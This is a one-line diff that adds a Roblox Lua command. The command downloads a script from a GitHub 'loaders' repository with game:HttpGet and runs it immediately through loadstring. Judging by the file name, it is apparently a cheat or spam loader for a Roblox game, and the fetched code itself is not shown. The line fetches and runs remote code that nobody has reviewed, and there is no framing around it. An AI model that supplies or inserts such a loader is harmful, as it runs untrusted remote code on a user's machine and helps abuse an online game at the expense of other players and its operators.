@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/get-your-driver-s-license-spam1-2ei1x36gg0u5x6.lua"))()
